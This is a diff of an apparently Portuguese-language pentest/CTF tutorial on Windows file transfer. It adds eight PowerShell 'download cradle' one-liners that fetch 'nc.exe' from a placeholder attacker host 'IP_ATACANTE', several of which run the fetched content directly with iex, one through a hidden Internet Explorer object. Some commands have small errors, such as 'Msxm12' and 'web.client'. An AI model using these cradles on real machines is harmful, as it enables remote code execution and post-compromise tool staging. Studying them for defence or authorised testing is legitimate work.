@@ -344,22 +344,58 @@ bitsadmin /transfer <nome_do _job> /priority foreground http://IP_ATACANTE/nc.ex
 
 ### Processo de Download com Powershell (Máquina Windows - Vítima) 
 
-Com certeza essa deve ser a forma mais conhecida de realizar download de arquivos em ambientes Windows, provavelmente você já deve ter usado e abusado dela muito durante o trabalho ou durante CTF's. O PowerShell é uma interface de linha de comando e uma linguagem de script desenvolvida pela Microsoft para sistemas Windows. Ela permite que os usuários interajam com o sistema operacional e realizem uma variedade de tarefas, desde tarefas simples até automações complexas. O PowerShell é especialmente poderoso para administração de sistemas, automação de tarefas e configuração de ambientes Windows. Ele oferece acesso a uma ampla gama de comandos, chamados de cmdlets, que permitem executar diversas operações, gerenciando arquivos, processos, usuários, redes e muito mais. Sua flexibilidade e capacidade de integração com outras tecnologias o tornam uma ferramenta valiosa para administradores de sistemas e profissionais de segurança. Nas versões mais atuais do Windows ao digitar **`wget`** ou **`curl`** provavelmente deve funcionar, pois esse é um alias para o **`Invoke-WebRequest`**, você pode validar isso facilmente digitando o comando **`Get-Help Invoke-WebRequest`**
+Com certeza essa deve ser a forma mais conhecida de realizar download de arquivos em ambientes Windows, provavelmente você já deve ter usado e abusado dela muito durante o trabalho ou durante CTF's. O PowerShell é uma interface de linha de comando e uma linguagem de script desenvolvida pela Microsoft para sistemas Windows. Ela permite que os usuários interajam com o sistema operacional e realizem uma variedade de tarefas, desde tarefas simples até automações complexas. O PowerShell é especialmente poderoso para administração de sistemas, automação de tarefas e configuração de ambientes Windows. Ele oferece acesso a uma ampla gama de comandos, chamados de cmdlets, que permitem executar diversas operações, gerenciando arquivos, processos, usuários, redes e muito mais.
 
-Para usar o **`Invoke-WebRequest`** siga as etapas abaixo:
+Se você está utilizando uma versão mais atual do Windows, é possível usar os comandos **`wget`** ou **`curl`**, pois ambos são aliases para o **`Invoke-WebRequest`**. Para verificar mais informações sobre o comando, basta digitar **`Get-Help Invoke-WebRequest`** no PowerShell.
 
-1. Abra um terminal powershell ou cmd e digite o comando abaixo:
+A flexibilidade do PowerShell possibilita várias formas de realizar o download de arquivos utilizando o **`Invoke-WebRequest`**, e a seguir, serão demonstrados alguns exemplos práticos desses modos.
+
+1. Invoke Webrequest
 
 ```powershell
 invoke-webrequest -uri "http://IP_ATACANTE/nc.exe" -outfile "nc.exe"
 ```
-ou
-```
+
+2. Wget
+
+```powershell
 powershell -c "wget 'http://IP_ATACANTE/nc.exe' -outfile 'nc.exe'
 ```
-ou
+
+3. Web Client
+
 ```powershell
 (new-object web.client).downloadfile("http://IP_ATACANTE/nc.exe","c:/path/to/nc.exe")
+```
+
+4. Invoke Webrequest DownloadString 
+
+```powershell
+iex (New-Object Net.WebClient).DownloadString('http://IP_ATACANTE/nc.exe')
+```
+
+5. Internet Explorer
+
+```powershell
+$ie = New-Object -ComObject InternetExplorer.Application; $ie.visible=$False; $ie.navigate('http://IP_ATACANTE/nc.exe'); sleep 5; $response = $ie.Document.body.innerHTML; $ie.quit(); iex $response
+```
+
+6. Internet Explorer com Invoke Webrequest
+
+```powershell
+iex (iwr 'http://IP_ATACANTE/nc.exe')
+```
+
+7. XML Msxm12.XMLHTTP
+
+```powershell
+$h = New-Object -ComObject Msxm12.XMLHTTP; $h.open('GET', 'http://IP_ATACANTE/nc.exe', $False); $h.send(); iex $h.responseText
+```
+
+8. DotNet System.NET.WebRequest
+
+```powershell
+$wr = [System.NET.WebRequest]::Create("http://IP_ATACANTE/nc.exe"); $r = $wr.GetResponse(); IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
 ```
 
 ## PHP e Certreq
